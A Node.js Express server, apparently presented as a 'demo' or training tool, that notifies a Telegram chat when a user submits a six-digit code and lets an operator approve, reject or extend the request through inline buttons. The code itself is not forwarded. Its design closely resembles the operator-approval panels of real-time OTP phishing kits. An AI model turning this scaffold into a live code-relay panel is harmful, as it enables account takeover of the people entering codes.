const express = require("express");
const path = require("path");
const TelegramBot = require("node-telegram-bot-api");

const app = express();
const PORT = process.env.PORT || 3000;

// Telegram configuration
const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;

const bot = TELEGRAM_BOT_TOKEN
  ? new TelegramBot(TELEGRAM_BOT_TOKEN, { polling: true })
  : null;

app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// Store demo requests in memory
const requests = new Map();

/*
  Serve the frontend
*/
app.use(express.static(path.join(__dirname, "public")));

app.get("/", (req, res) => {
  res.sendFile(path.join(__dirname, "public", "index.html"));
});

/*
  Health check
*/
app.get("/health", (req, res) => {
  res.json({
    status: "ok",
    demo: true
  });
});

/*
  Create a demo request.
  The entered OTP/demo code is NOT transmitted to Telegram.
*/
app.post("/api/demo-request", async (req, res) => {
  const requestId =
    Date.now().toString(36) +
    Math.random().toString(36).substring(2, 8);

  const createdAt = new Date();

  const time = new Intl.DateTimeFormat("en-GB", {
    timeZone: "Africa/Nairobi",
    year: "numeric",
    month: "2-digit",
    day: "2-digit",
    hour: "2-digit",
    minute: "2-digit",
    second: "2-digit",
    hour12: false
  }).format(createdAt);

  const demoRequest = {
    id: requestId,
    status: "pending",
    createdAt: createdAt.toISOString()
  };

  requests.set(requestId, demoRequest);

  if (bot && TELEGRAM_CHAT_ID) {
    try {
      await bot.sendMessage(
        TELEGRAM_CHAT_ID,
        `🧪 DEMO VERIFICATION
━━━━━━━━━━━━━━━━━━━━

USER DETAILS:

• Request ID: ${requestId}
• Time: ${time}
• Demo code entered: YES

━━━━━━━━━━━━━━━━━━━━

VERIFY THE DEMO:

• Demo code length: 6 digits
• Timeout: 5 minutes

━━━━━━━━━━━━━━━━━━━━

⏳ PENDING REVIEW`,
        {
          reply_markup: {
            inline_keyboard: [
              [
                {
                  text: "✅ Correct Demo",
                  callback_data: `approve:${requestId}`
                },
                {
                  text: "❌ Wrong Demo",
                  callback_data: `reject:${requestId}`
                }
              ],
              [
                {
                  text: "⏱ Extend Time",
                  callback_data: `extend:${requestId}`
                }
              ]
            ]
          }
        }
      );
    } catch (error) {
      console.error("Telegram error:", error.message);
    }
  }

  res.json({
    success: true,
    requestId,
    status: "pending"
  });
});

/*
  Check the status of a demo request
*/
app.get("/api/demo-request/:id", (req, res) => {
  const request = requests.get(req.params.id);

  if (!request) {
    return res.status(404).json({
      success: false,
      error: "Demo request not found"
    });
  }

  res.json({
    success: true,
    requestId: request.id,
    status: request.status
  });
});

/*
  Telegram buttons
*/
if (bot) {
  bot.on("callback_query", async (query) => {
    const data = query.data || "";

    const [action, requestId] = data.split(":");

    if (!requestId) {
      return;
    }

    const request = requests.get(requestId);

    if (!request) {
      await bot.answerCallbackQuery(query.id, {
        text: "Demo request expired."
      });
      return;
    }

    /*
      CORRECT DEMO
    */
    if (action === "approve") {
      request.status = "approved";

      await bot.answerCallbackQuery(query.id, {
        text: "Demo approved."
      });

      await bot.editMessageText(
        `🧪 DEMO VERIFICATION
━━━━━━━━━━━━━━━━━━━━

Request ID: ${requestId}

Status: ✅ CORRECT DEMO`,
        {
          chat_id: query.message.chat.id,
          message_id: query.message.message_id
        }
      );
    }

    /*
      WRONG DEMO
    */
    if (action === "reject") {
      request.status = "rejected";

      await bot.answerCallbackQuery(query.id, {
        text: "Demo rejected."
      });

      await bot.editMessageText(
        `🧪 DEMO VERIFICATION
━━━━━━━━━━━━━━━━━━━━

Request ID: ${requestId}

Status: ❌ WRONG DEMO

The training page can now allow the
user to re-enter the demonstration code.`,
        {
          chat_id: query.message.chat.id,
          message_id: query.message.message_id
        }
      );
    }

    /*
      EXTEND TIME
    */
    if (action === "extend") {
      request.status = "pending";

      await bot.answerCallbackQuery(query.id, {
        text: "Demo time extended."
      });

      await bot.editMessageText(
        `🧪 DEMO VERIFICATION
━━━━━━━━━━━━━━━━━━━━

Request ID: ${requestId}

Status: ⏱ TIME EXTENDED

The training request remains pending.`,
        {
          chat_id: query.message.chat.id,
          message_id: query.message.message_id,
          reply_markup: {
            inline_keyboard: [
              [
                {
                  text: "✅ Correct Demo",
                  callback_data: `approve:${requestId}`
                },
                {
                  text: "❌ Wrong Demo",
                  callback_data: `reject:${requestId}`
                }
              ],
              [
                {
                  text: "⏱ Extend Time",
                  callback_data: `extend:${requestId}`
                }
              ]
            ]
          }
        }
      );
    }
  });
}

app.listen(PORT, () => {
  console.log(`Demo server running on port ${PORT}`);
});
